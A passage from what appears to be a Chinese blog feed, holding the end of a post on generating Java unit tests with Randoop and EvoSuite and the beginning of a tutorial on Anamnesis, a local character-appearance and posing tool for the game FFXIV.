class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用参数 <code>--testclass</code> 指定被测类，注意需要添加 classpath</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译</span></span><br><span class="line">javac Message.java</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成测试</span></span><br><span class="line">java -classpath <span class="string">&quot;.;<span class="variable">$Env</span>:RANDOOP_JAR&quot;</span> randoop.main.Main gentests --testclass=Message --time-limit=60</span><br></pre></td></tr></table></figure><p>生成 199 个回归测试，直接将相关文件都拖到 test 目录下，执行测试，全部通过</p><img src="https://s2.loli.net/2022/04/27/5J6w4st93zOim2a.jpg" ><p>创建 Sum.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sum</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; b; i++) &#123;</span><br><span class="line">            result = add(result, a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为 .class 文件，并生成测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译</span></span><br><span class="line">javac Sum.java</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成测试</span></span><br><span class="line">java -classpath <span class="string">&quot;.;<span class="variable">$Env</span>:RANDOOP_JAR&quot;</span> randoop.main.Main gentests --testclass=Sum --time-limit=60</span><br></pre></td></tr></table></figure><p>生成 1360 个测试，更改代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sum</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b + <span class="number">1</span>;  <span class="comment">// 修改</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; b; i++) &#123;</span><br><span class="line">            result = add(result, a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新运行刚才生成的回归测试，1357 个测试失败</p><img src="https://s2.loli.net/2022/04/27/k3JyxITYrBjsPce.jpg" style="zoom: 65%;"><h3 id="指定方法"><a href="#指定方法" class="headerlink" title="指定方法"></a>指定方法</h3><p>可能用到的参数</p><ul><li>指定测试范围的常见度依次递减，同时出错的概率递增：指定 jar，指定类，指定方法</li><li><a href="https://randoop.github.io/randoop/manual/class_list_example.txt">classlist.txt 示例</a></li><li><a href="https://randoop.github.io/randoop/manual/method_list_example.txt">methodlist.txt 示例</a></li></ul><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>--testjar=filename</code></td><td>将给定 jar 文件中的每个类作为待测类</td></tr><tr><td><code>--classlist=filename</code></td><td>列出要测试的类，所有的方法都将作为被测方法</td></tr><tr><td><code>--testclass=string</code></td><td>指定待测类（完全限定名）</td></tr><tr><td><code>--methodlist=filename</code></td><td>测试中调用的方法和构造函数列表（完全限定名）</td></tr><tr><td><code>--omit-classes=regex</code></td><td>正则表达式，指定不在测试中使用的类</td></tr><tr><td><code>--omit-classes-file=filename</code></td><td>列出正则表达式，指定不在测试中使用的类</td></tr><tr><td><code>--omit-methods=regex</code></td><td>正则表达式，指定不在测试中使用的方法。不会阻止其他方法对其的间接调用</td></tr><tr><td><code>--omit-methods-file=filename</code></td><td>列出正则表达式，指定不在测试中使用的方法</td></tr><tr><td><code>--require-classname-in-test=regex</code></td><td>正则表达式，指定必须在测试中出现的类。</td></tr><tr><td><code>--require-covered-classes=filename</code></td><td>列出测试必须直接或间接使用的类，包含其中一个即输出</td></tr><tr><td><code>--no-regression-tests=boolean</code></td><td>禁用回归测试输出</td></tr><tr><td><code>--deterministic=boolean</code></td><td>确定性，相同输入相同输出</td></tr><tr><td><code>--log=filename</code></td><td>日志记录</td></tr><tr><td><code>--time-limit=int</code></td><td>0 表示没有限制，如果非零则不确定。总体限制，默认值 100 秒</td></tr><tr><td><code>--method-selection=&lt;enum&gt; </code></td><td>通过从一组被测方法中进行选择来生成新的测试。默认均匀随机（UNIFORM），可选优先考虑分支覆盖率较低的方法（BLOODHOUND）</td></tr><tr><td><code>--input-selection=&lt;enum&gt; </code></td><td>通过组合以前生成的旧测试来生成新测试。默认均匀随机（UNIFORM），可选短序列偏好（SMALL_TESTS）</td></tr></tbody></table><p>Randoop 项目想法中包括方法选择策略的优化，其中就提到了让用户指定关键方法，目前似乎还没有具体实现。</p><ol><li><p>考虑修改 Randoop 的默认生成器（ForwardGenerator）</p><ul><li>生成策略</li><li>满足特定条件时，向标准错误进行输出，应该会存储在 ErrorTest 中</li></ul></li><li><p>使用方法规范（<code>--specifications=file</code>）设置特定方法的预期行为，将其归类到错误显示测试中</p><ul><li><a href="https://randoop.github.io/randoop/manual/net_connection_spec.json">spec.json 示例</a></li></ul></li></ol><h3 id="问题与解决"><a href="#问题与解决" class="headerlink" title="问题与解决"></a>问题与解决</h3><ol><li><p>乱码</p><ul><li><code>Settings - Editor -File Encodings</code> 将编码全部改为 UTF-8</li><li>在 <code>idea64.exe.vmoptions</code> 末尾添加 <code>-Dfile.encoding=UTF-8</code></li><li>重启 IDEA</li></ul></li><li><p>rawtypes</p><ul><li>泛型类缺少类参数，添加 <code>&lt;?&gt;</code> 即可</li></ul></li><li><p>程序包不存在</p></li><li><p>cast</p></li></ol><img src="https://s2.loli.net/2022/04/27/c9vaBTLw63Eq2CD.png" ><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><p>在 Randoop 中，测试输入表示为 Sequence，测试检查使用 Checks 表示。每个序列由一个或多个 Statement 对象组成。</p><p>Randoop 的生成算法创建 Sequence，为每个序列添加适当的 Checks，并将结果作为单元测试输出。</p><h3 id="Sequence"><a href="#Sequence" class="headerlink" title="Sequence"></a>Sequence</h3><p>Randoop 生成 Sequence 对象，通过添加检查来构造单元测试的输入。在 Randoop 中，所有测试输入都是使用被测类的方法和构造函数的操作序列。</p><p>每条语句包含三个元素：</p><ul><li>正在被调用的特定方法（或构造函数）</li><li>每次调用返回的值（原始值或对象）</li><li>调用的输入，来自先前语句中产生的值</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">                  Result      Operation        Inputs</span><br><span class="line">                  ======      =============        ======</span><br><span class="line">statement 0:      l       =   new LinkedList       ()</span><br><span class="line">statement 1:      str     =   &quot;hi!&quot;                ()</span><br><span class="line">statement 2:                  addFirst             (l, str)</span><br><span class="line">statement 3:      i       =   size                 (l)</span><br><span class="line">statement 4:      t       =   new TreeSet          (l)</span><br><span class="line">statement 5:      s       =   synchronizedSet      (t)</span><br></pre></td></tr></table></figure><p>语句的三个元素映射到 Randoop 中的以下类：</p><ul><li><p>Operation 表示语句执行的操作类型</p><ul><li>MethodCall 表示特定的方法调用。该类与 Java 反射 Method 类相似，添加了对 Randoop 有用的附加功能。</li><li>ConstructorCall 表示构造函数调用。</li><li>FieldGet 和 FieldSet 表示获取和设置公共字段。字段由实现 AccessibleField 的类的实例表示。</li><li>EnumConstant 表示一个枚举常量值。</li><li>NonreceiverTerm 表示将变量声明和初始化为原始值、字符串或空值的语句。</li><li>ArrayCreation 表示声明并初始化一个数组的语句，该数组由之前语句中创建的值组成。</li></ul></li><li><p>Variables 代表语句的输入和输出</p><ul><li>Variable 只是序列中索引的包装器：给定序列 s，变量 s.getVariable(i) 表示序列中第 i 个语句产生的值。</li></ul></li></ul><p>创建 sequence</p><ol><li>通过扩展（extension）：获取一个序列并在底部添加一个新语句</li><li>使用串联（concatenation）：给的序列 s1、s2、s3，创建串联的新序列<ul><li>Randoop 组合创建新序列的方法</li></ul></li><li>从字符串中解析（parseable）出序列</li></ol><p>注意：Sequence 是不可变的，扩展操作返回新序列。</p><p>如果代码涉及参数化类型，那就需要实例化使用的泛型类类型，以便获得需要的类型替换。</p><h3 id="ExecutableSequence"><a href="#ExecutableSequence" class="headerlink" title="ExecutableSequence"></a>ExecutableSequence</h3><p>ExecutableSequence 包装 Sequence 并添加两个功能：</p><ul><li>ExecutableSequence 可以通过对预期属性的检查来增强。 Check 是一个对象，表示序列的某些预期属性；例如，序列中的特定方法调用正常返回。当可执行序列被执行时，序列中存在的任何检查都会在运行时检查，并且检查的通过&#x2F;失败状态可供客户端检查。</li><li>ExecutableSequence 可以执行。 Randoop 使用 Java 的反射机制来调用序列中的方法和构造函数，并使用底层 Sequence 的结构来确定要传递给它们的输入。</li></ul><p>执行 sequence</p><ul><li>在 execute 方法返回后，可以通过 getResult(int i) 方法访问执行过程中创建的运行时对象，该方法返回执行语句 i 的结果。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExecutableSequence</span> <span class="variable">es</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExecutableSequence</span>(s);</span><br><span class="line">es.execute(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ExecutionOutcome</span> <span class="variable">resultAt3</span> <span class="operator">=</span> es.getResult(<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>更多内容参见 Execution 和 ExecutionOutcome 类。</p><h3 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h3><p>Check 是表示序列的预期属性的对象。就单元测试而言，Check 代表单元测试的一些检查代码。</p><p>每个 Check 都与序列中的一个索引相关联，其中该索引表示应该执行检查的时间。</p><p>Randoop 通过组合和扩展之前生成的序列来随机生成测试输入（Sequence）。另一方面，Randoop 确定性地执行其检查。对于创建的每个序列，它都会检查该序列的所有对象。</p><h3 id="ForwardGenerator"><a href="#ForwardGenerator" class="headerlink" title="ForwardGenerator"></a>ForwardGenerator</h3><p>选择器有两个：</p><ul><li><code>inputSequenceSelector</code>：选择序列</li><li><code>operationSelector</code>：选择方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** How to select sequences as input for creating new sequences. */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> InputSequenceSelector inputSequenceSelector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** How to select the method to use for creating a new sequence. */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> TypedOperationSelector operationSelector;</span><br></pre></td></tr></table></figure><p>执行序列，在该方法中可以获得序列每条语句的执行结果</p><ul><li>检查输出的文本信息</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@Nullable</span> ExecutableSequence <span class="title function_">step</span><span class="params">()</span> &#123;...&#125;</span><br></pre></td></tr></table></figure><p>生成序列，在该方法中可以选择下一条语句（Operation）并进行拼接</p><ul><li>默认使用随机均匀的选择器</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ExecutableSequence <span class="title function_">createNewUniqueSequence</span><span class="params">()</span> &#123;...&#125;</span><br></pre></td></tr></table></figure><p>Operation 集合从哪里来？</p><ul><li>通过反射遍历类当中的方法，将访问信息输出到日志中</li><li>reflection 目录下有多种不同的 Extractor，用于提取信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ForwardGenerator</span><br><span class="line">GenTests#handle</span><br><span class="line">OperationModel#createModel</span><br><span class="line">OperationModel#addOperationsFromClasses</span><br><span class="line">OperationExtractor#operations</span><br><span class="line">ReflectionManager#apply</span><br></pre></td></tr></table></figure><h1 id="EvoSuite"><a href="#EvoSuite" class="headerlink" title="EvoSuite"></a>EvoSuite</h1><h2 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h2><p>相比 Randoop，EvoSuite 的说明就简陋了很多，但是输出的信息非常多。</p><p>EvoSuite 的大量参数都放在了 <code>-D</code> 选项中，需要用键值的方式给出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 帮助信息</span></span><br><span class="line">java -jar evosuite-1.2.0.jar -<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可用参数</span></span><br><span class="line">java -jar evosuite-1.2.0.jar -listParameters</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成测试，默认 -generateMOSuite，运行 40min 未完成</span></span><br><span class="line">java -jar evosuite-1.2.0.jar -target test.jar -generateMOSuite</span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR AgentLoader - Exception class java.lang.RuntimeException: AttachProvider.providers() failed to <span class="built_in">return</span> any provider. Tool classloader: java.net.FactoryURLClassLoader@2c537884</span><br></pre></td></tr></table></figure><p>扔到 linux 环境下可以成功执行，执行将生成两个文件夹：</p><ul><li>evosuite-tests：生成的单元测试</li><li>evosuite-report：包含 csv 统计数据和 html 报告，例如出参数、测试用例、覆盖率等信息</li></ul><img src="https://s2.loli.net/2022/04/27/LjWs8qkuvXh6M3b.png" ><p>从输出的测试来看，似乎是对每个类生成测试（而 Randoop 是随机导向测试）</p><img src="https://s2.loli.net/2022/04/27/R9Ek6ZUlqFt4esM.png" ><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li><p>和时间相关的参数很多，可配置参数太多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -D 可选参数</span></span><br><span class="line">search_budgetlong60Maximum search duration</span><br></pre></td></tr></table></figure></li><li><p>统计信息很多，但不一定都用得到</p></li><li><p>从可用参数帮助信息来看，可以最后进行过滤，或直接指定生成测试使用的方法</p><ul><li>没有说明如果存在依赖会是什么情况</li><li>注：需要使用字节码签名</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-class &lt;arg&gt;target class <span class="keyword">for</span> <span class="built_in">test</span> generation. A fully qualifying needs to be provided, e.g. org.foo.SomeClass</span><br><span class="line"><span class="comment"># -D 可选参数</span></span><br><span class="line">junit_strictboolean<span class="literal">false</span>Only include <span class="built_in">test</span> files containing the target classname</span><br><span class="line">target_methodStringMethod <span class="keyword">for</span> <span class="built_in">which</span> to generate tests</span><br><span class="line">target_method_listStringA colon(:) separated list of methods <span class="keyword">for</span> <span class="built_in">which</span> to generate tests</span><br></pre></td></tr></table></figure></li><li><p>生成的单元测试依赖 EvoSuite 框架本身，需要添加 evosuite-standalone-runtime.jar</p></li></ol><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://github.com/JuYoungJeon/randoopTutorial">randoopTutorial</a></li><li><a href="https://www.youtube.com/watch?v=FR89jtjBCEA">Generating JUnit test suites with Randoop</a></li><li><a href="https://qiita.com/taka_22/items/cd0a7ed1ed10635fc1a3">Java用JUnitテストクラスジェネレータRandoopについて調べてみた</a></li><li><a href="https://medium.com/@marcus.jonssonewerbring/tutorial-an-introduction-to-unit-test-regression-test-and-code-coverage-with-intellij-b08be1268719">[Tutorial] An introduction to unit test, regression test and code coverage with IntelliJ</a></li><li><a href="https://randoop.github.io/randoop/manual/index.html">Randoop Manual</a></li><li><a href="https://randoop.github.io/randoop/manual/dev.html">Randoop Developer’s Manual</a></li><li><a href="https://randoop.github.io/randoop/projectideas.html">Randoop project ideas</a></li><li><a href="https://www.evosuite.org/documentation/commandline/">Commandline | EvoSuite</a></li><li><a href="https://www.evosuite.org/documentation/tutorial-part-1/">Tutorial Part 1: EvoSuite on the Command Line</a></li><li><a href="https://github.com/EvoSuite/evosuite/issues/47">class com.sun.tools.attach.AttachNotSupportedException no providers installed #47</a></li></ul>]]></content>
    
    
    <summary type="html">调研 Java 开源测试框架，上手使用 Randoop 与 EvoSuite</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>FF14 Anamnesis 使用教程</title>
    <link href="https://jckling.github.io/2022/03/23/Game/FFXIV/FF14-Anamnesis%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>https://jckling.github.io/2022/03/23/Game/FFXIV/FF14-Anamnesis%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</id>
    <published>2022-03-23T01:21:02.000Z</published>
    <updated>2023-03-05T05:05:19.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note warning flat"><ol><li><p>Anamnesis 支持国际服，对国服的功能支持有限；支持中文；仅支持 64 位 Windows 10 及以上版本；仅支持 DX11。</p></li><li><p>国服（6.25）请使用 <a href="https://github.com/imchillin/Anamnesis/releases/tag/v2022-10-19">2022-10-19</a>，遇到错误可以尝试安装更新的版本，最新版适配国际服 6.31。</p></li><li><p>使用过程中若发现中文翻译有问题请反馈🙏。</p></li><li><p>无法访问&#x2F;下载请尝试挂梯子。</p></li></ol><p><em>PS：评论审核需要时间，不要重复刷评论</em> 🆘</p></div><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前用 CMTool 换装备改时间，最近更新的 v2.0.15.4 支持国服，但一用目标模式加载装备就导致模型消失，不得不返回标题界面重新进游戏，四舍五入就是没法用。重新翻了下 Anamnesis 的 <a href="https://github.com/imchillin/Anamnesis/wiki/Troubleshooting">Troubleshooting</a>，发现是说 <strong>对国服的支持不完整</strong>，并不是完全不能用。</p><blockquote><p>Make sure you are running the International client of the game (JP&#x2F;NA&#x2F;EU). Note that the Chinese and Korean clients are not fully supported at this time, so you may have limited use of the tool with these clients.</p></blockquote><p>Anamnesis 和 CMTool 一样，修改的是本地客户端数据，可以在游戏中更改种族、性别、外貌、装备等，而不会将数据上传到服务器，所以<strong>其他玩家也看不到你的更改</strong>。</p><p>除了这些“捏人”相关的操作，还可以用它将角色转换成道具、怪物、NPC 等，因为是 CMTool 的上位替代，同样支持加载动作&#x2F;表情（Posing Matrix 模块），在 GPose 模式中的旋转、位移等。</p><p><strong>注意：</strong>仅支持 64 位的 Windows10 或 Windows11，仅支持 DX11。电脑配置不符合要求的就只能用 CMTool 了，可能出现加载外观导致模型消失等问题，暂时还没有解决。CMTool 的教程可以看：<a href="https://jckling.github.io/2021/04/26/Game/FFXIV/FF14-CMTool%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">FF14 CMTool 使用教程</a>。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>首先需要安装 64 位的运行时 <a href="https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/runtime-desktop-6.0.6-windows-x64-installer">.NET 6.0 Desktop Runtime x64</a>，如果提示已安装更高版本的运行时则可以忽略。</p><img src="https://s2.loli.net/2023/03/05/FMrJCw7KvloE16q.jpg" style="zoom:67%;" /><p>和 CMTool 同一组织的开源软件，直接上 Github 下载：<a href="https://github.com/imchillin/Anamnesis/releases">imchillin&#x2F;Anamnesis</a>。下载图示中的 zip 压缩包，并解压到想要安装的目录。</p><img src="https://s2.loli.net/2022/03/25/rItXjQeaFVW4UxM.png" style="zoom:80%;" /><p>2022-03-24 版本解压之后包含以下文件，双击 Anamnesis.exe 启动工具。</p><img src="https://s2.loli.net/2022/03/25/SRLJiWMdkIhylAm.png" style="zoom:80%;" /><p><strong>注意：</strong>该工具同样需要在进入游戏之后再启动，否则显示等待进程。比 CMTool 疯狂弹窗好多了xd</p><img src="https://s2.loli.net/2022/03/25/saC3hL4HNwBD2yE.jpg" style="zoom:70%;" /><p>因为 Anamnesis 不完全支持国服，所以启动后会弹提示版本可能有问题，点击 OK 继续使用。</p><img src="https://s2.loli.net/2022/03/25/zLkMUR4fYHhnO1w.jpg" style="zoom:70%;" /><h1 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h1><p>Anamnesis 一共包含 5 个选项卡，这里根据 <a href="https://github.com/imchillin/Anamnesis/wiki">Anamnesis Wiki</a> 和实际使用的经验简单介绍。</p><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p>左下角的 <code>i</code> 图标（info），点击后右侧弹出浮出控件，显示有关工具本身的信息，例如版本号和创建过程中使用的各种资源，以及社交媒体和支持链接，下面还有访问日志和设置的入口。</p><img src="https://s2.loli.net/2022/03/25/oJUnbePzvIxAEZV.jpg" style="zoom:80%;" /><h2 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h2><p>点击最上方的帮助会弹出 <a href="https://github.com/imchillin/Anamnesis/wiki">Wiki</a>；点击左下角齿轮图标打开设置，右侧弹出浮出控件，显示设置选项。</p><ul><li><strong>语言</strong>：支持英语、中文、韩语、法语等。</li><li><strong>置顶</strong>：允许将 Anamnesis 窗口保持在所有其他窗口（包括游戏窗口）之上，使最上方的图钉按钮也可以激活或关闭。</li><li><strong>迷你模式</strong>：显示悬浮 Logo，点击后展开界面。</li><li><strong>窗口透明</strong>：默认情况下，将鼠标悬停在 Anamnesis 窗口上会导致窗口变回完全不透明。激活该选项将一直保持设置的透明度，可以边操作边看游戏窗口。</li><li><strong>窗口透明度</strong>：默认为 1（不透明）。</li><li><strong>窗口比例</strong>：下拉列表包含一系列窗口比例选项，1 表示默认大小。</li><li><strong>显示文件扩展名</strong>：即显示文件后缀。</li><li><strong>使用 Windows 文件浏览器</strong>：即使用系统自带的文件资源管理器。</li><li><strong>使用 Akinson Hyperlegible 字体</strong>：改字体，个人觉得默认的更好看。</li><li><strong>环绕旋转滑块</strong>：默认启用，暂时不知道具体影响什么。</li><li><strong>画廊</strong>：精选、本地等，估计是左侧一直加载不出来的面板。</li><li><strong>文件夹位置</strong>：角色、动作和场景文件的保存位置，点击 <code>...</code> 按钮更新。默认情况下，文件保存在 <code>文档/Anamnesis</code> 目录下。</li></ul><img src="https://s2.loli.net/2022/03/25/NtFvSsXaqUkw5Pp.jpg" style="zoom:80%;" /><p><strong>覆盖系统主题</strong>后可以选择明亮模式和自定义主题色。</p><img src="https://s2.loli.net/2022/03/25/Vqtb5UfgNFEj6xI.jpg" style="zoom:80%;" /><h2 id="Home"><a href="#Home" class="headerlink" title="Home"></a>Home</h2><p>用于操作世界和相机的工具，显示画廊和帮助提示。左侧一直加载不出来的面板应该就是画廊，下方是帮助提示，右侧是操作世界和相机的面板。</p><p><strong>更改时间</strong>：首先需要点击那个锁的图标，然后可以直接拖滚动条或输入数字。</p><p><strong>更改天气</strong>：需要先锁定时间，而且只能加载“有效”天气，即当前所在地区的有效天气。修改天气后可以发现地图旁边的天气图标改变，等待一小会儿场景的天气就会发生改变。</p><img src="https://s2.loli.net/2022/03/25/v1IniMZHd6mLauW.jpg" style="zoom:80%;" /><p>进入 GPose 模式能使用下方的相机选项，但不能改变时间和天气。</p><ul><li>相机 XYZ 轴</li><li>视角 XY 轴</li><li>旋转</li><li>仰视&#x2F;俯视角度</li><li>缩放比例</li><li>视野大小</li></ul><img src="https://s2.loli.net/2022/03/25/RMHFSDJnv7sNKTc.jpg" style="zoom:80%;" /><h2 id="Character"><a href="#Character" class="headerlink" title="Character"></a>Character</h2><p>用于为角色，也称为 <strong>演员（actor）</strong> 操作各种细节，包括外观和装备。可以保存和加载角色外观、NPC 外观或怪物外观、调整外貌扩展。外貌扩展是在游戏中通常无法更改的额外部分，包括肤色、反光、瞳色、瞳孔轮廓等。（捏人数据大放送.jpg）</p><img src="https://s2.loli.net/2022/03/25/YPsErAU2IalVTbo.jpg" style="zoom:80%;" /><p>打开 Anamnesis 时如果左侧没有角色选项卡，则在游戏中选中角色后点击 <code>+</code> 按钮增加，右键可以解除或选中，左键直接点击打开该选项卡就是选中。</p><img src="https://s2.loli.net/2022/03/25/QN2tyTOZGuacJnr.jpg" style="zoom:80%;" /><p><strong>自定义</strong>：即捏人数据，无效值可能会导致部分模型消失</p><ul><li>眼睛、脸部从 1 开始编号</li><li>下颌、眉毛、鼻型、尾巴形状从 0 开始编号，耳朵形状从 1 开始编号</li><li>瞳色的锁定默认关闭（异色）</li><li>装饰除了目前已有的，还包括之前的遗产纹身</li></ul><p><strong>肤色</strong>：和游戏实际的界面一一对应，非常友好！</p><img src="https://s2.loli.net/2022/03/25/6JtEzZLKYai9m8W.jpg" style="zoom:80%;" /><p><strong>发型</strong>：给出了当前种族的所有可用发型，包括使用发型样式获得的发型。</p><img src="https://s2.loli.net/2022/03/25/7PLajMQYZJ8c9BS.jpg" style="zoom:80%;" /><p><strong>注意：</strong>切换种族后默认保留属性，如果当前发型无法用则会显示光头，选择可用发型后就能正常显示了。</p><p><img src="https://s2.loli.net/2022/03/25/ZKYG8PJHamWTxEA.jpg" style="zoom:50%;" /><img src="https://s2.loli.net/2022/03/25/sXb9Rv3SFPhH74a.jpg" style="zoom:50%;" /></p><p><strong>装备</strong>：装备和染色，如果有投影则显示投影装备</p><ul><li>装备种族专用装备</li><li>装备 NPC 内衣</li><li>移除所有装备</li></ul><p>装备 NPC 内衣的效果如下（全裸）：</p><img src="https://s2.loli.net/2022/03/25/QYNMu1ntfE6Haig.jpg" style="zoom:80%;" /><p>点击身体装备后右侧弹出浮出控件，有许多过滤选项，支持直接搜索、选择 NPC 装备。</p><img src="https://s2.loli.net/2022/03/25/UTgDpkwcRxo8IMO.jpg" style="zoom:80%;" /><p>Anamnesis 在头部和身体装备列表中添加了“隐藏”项目，装备隐藏身体后只显示头部，再装备隐藏头部后只显示武器。</p><div class="tabs" id="隐藏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#隐藏-1">隐藏身体</button></li><li class="tab"><button type="button" data-href="#隐藏-2">隐藏身体和头部</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="隐藏-1"><p>只显示头部和武器：</p><img src="https://s2.loli.net/2022/03/25/lMoSypPrA3e9KDR.jpg" style="zoom:50%;" /><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="隐藏-2"><p>只显示武器：</p><img src="https://s2.loli.net/2022/03/25/4weOu7SasMxRy9E.jpg" style="zoom:50%;" /><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p><strong>角色</strong></p><ul><li>昵称，左侧选项卡和 Anamnesis 窗口顶部显示的名称</li><li>类型：玩家默认是 Player 类型，还有战斗 NPC、房屋等类型<ul><li>如果选择其他类型可能用不了一些功能，比如以太之光。</li></ul></li><li>模型：可以直接用来转换角色，前提是知道模型编号</li><li>透明度：最小 